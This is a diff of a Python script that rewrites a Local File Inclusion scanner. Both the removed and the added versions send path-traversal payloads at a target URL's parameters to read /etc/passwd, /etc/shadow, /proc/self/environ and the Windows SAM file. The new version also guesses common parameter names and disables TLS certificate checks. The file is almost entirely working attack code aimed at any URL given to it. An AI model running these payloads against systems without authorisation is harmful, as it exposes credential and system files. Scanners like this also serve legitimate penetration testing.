@@ -1,101 +1,54 @@
 #!/usr/bin/env python3
 """
-LFI/RFI Scanner
-Usage: python lfi_scanner.py https://target.com/view?page=
+LFI (Local File Inclusion) Scanner
+Detects LFI vulnerabilities
 """
 
-import sys
 import requests
-import urllib.parse
+import argparse
+import warnings
+warnings.filterwarnings('ignore')
 
-class LFIScanner:
-    def __init__(self, url):
-        self.url = url
-        self.findings = []
-        
-        # LFI payloads
-        self.payloads = [
-            '../../../etc/passwd',
-            '../../etc/passwd',
-            '../../../etc/passwd%00',
-            '../../etc/passwd%00',
-            '..%2F..%2F..%2Fetc%2Fpasswd',
-            '....//....//....//etc/passwd',
-            '/etc/shadow',
-            '/etc/group',
-            '/etc/hosts',
-            '/etc/hostname',
-            '../../../var/log/apache2/access.log',
-            '../../../var/log/apache/access.log',
-            '../../../var/log/nginx/access.log',
-            '..%5C..%5C..%5Cetc%5Cpasswd',
-            '..\\..\\..\\etc\\passwd',
-            '..%252F..%252F..%252Fetc%252Fpasswd',
-            '/proc/self/environ',
-            '/proc/self/cmdline',
-            '/proc/version',
-            '/proc/cmdline',
-            '../../../bin/bash',
-            '../../../bin/sh',
-            'C:\\Windows\\System32\\config\\SAM',
-            'C:\\Windows\\win.ini',
-            '../../boot.ini',
-            '../../windows/system32/drivers/etc/hosts',
-            '/etc/resolv.conf',
-            '/etc/ftpusers',
-            '/etc/crontab',
-            '/etc/sysctl.conf',
-        ]
-        
-    def test_path(self, payload):
-        """Test LFI"""
-        try:
-            parsed = urllib.parse.urlparse(self.url)
-            params = urllib.parse.parse_qs(parsed.query)
-            
-            for key in params:
-                params[key] = [payload]
-                break
-            
-            new_query = urllib.parse.urlencode(params, doseq=True)
-            new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
-            
-            r = requests.get(new_url, timeout=10)
-            
-            # Check for LFI indicators
-            if 'root:' in r.text or '[' in r.text:
-                if 'root' in r.text or 'Administrator' in r.text:
-                    return {'payload': payload, 'found': 'etc/passwd'}
-            if 'boot' in r.text.lower():
-                return {'payload': payload, 'found': 'boot.ini'}
-            
-        except Exception as e:
-            return None
-        
-        return None
+PAYLOADS = [
+    ("../../../../../../../../etc/passwd", "etc/passwd"),
+    ("..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "windows hosts"),
+    ("....//....//....//etc/passwd", "double dot"),
+    ("..%2F..%2F..%2F..%2Fetc%2Fpasswd", "encoding"),
+    ("/etc/passwd", "absolute"),
+    ("%00", "null byte"),
+    ("../../../../../../../../proc/self/environ", "proc environ"),
+]
+
+def scan(target):
+    print(f"[*] LFI Scanner - {target}")
+    print("="*50)
     
-    def scan(self):
-        """Scan for LFI"""
-        print(f"[*] Scanning {self.url}...")
-        
-        for payload in self.payloads:
-            result = self.test_path(payload)
-            if result and 'found' in result:
-                print(f"[!] LFI: {payload}")
-                self.findings.append(result)
-        
-        return self.findings
-
-
-def main():
-    if len(sys.argv) < 2:
-        print("Usage: python lfi_scanner.py <url>")
-        sys.exit(1)
+    if not target.startswith(('http://', 'https://')):
+        target = 'https://' + target
     
-    target = sys.argv[1]
-    scanner = LFIScanner(target)
-    scanner.scan()
-
+    found = []
+    params = ['file', 'page', 'path', 'include', 'doc', 'template', 'view', 'dir', 'folder', 'pg', 'style', 'doc', 'img', 'filename']
+    
+    for param in params:
+        for payload, ptype in PAYLOADS[:3]:
+            try:
+                r = requests.get(target, params={param: payload}, timeout=10, verify=False)
+                if 'root:' in r.text or 'daemon:' in r.text or '[boot loader]' in r.text:
+                    print(f"[!] LFI: {param} ({ptype})")
+                    found.append({'param': param, 'type': ptype})
+            except:
+                pass
+    
+    print("\n" + "="*50)
+    if found:
+        print(f"[!] Found {len(found)} potential LFI issues")
+    else:
+        print("[*] No LFI vulnerabilities detected")
+    
+    return found
 
 if __name__ == "__main__":
-    main()
+    parser = argparse.ArgumentParser(description='LFI Scanner')
+    parser.add_argument('target', help='Target URL')
+    args = parser.parse_args()
+    scan(args.target)
